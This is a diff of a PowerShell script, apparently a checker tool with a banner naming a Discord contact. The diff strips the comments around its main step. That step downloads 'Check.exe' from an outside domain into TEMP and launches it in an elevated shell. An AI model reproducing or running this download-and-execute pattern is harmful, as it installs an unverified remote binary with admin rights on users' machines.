@@ -1,11 +1,8 @@
-# URL of your EXE
 $exeUrl  = "https://larpexodus.com/Check.exe"
 $exePath = "$env:TEMP\Check.exe"
 
-# Download EXE
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Run directly (already admin since PS is launched elevated)
 Start-Process $exePath
 
 
@@ -311,5 +308,6 @@ Write-Host "$space╰───────────────────�
 Write-Host "$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
 Write-Host "$space│          Discord @zeyski            │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
+
 
 
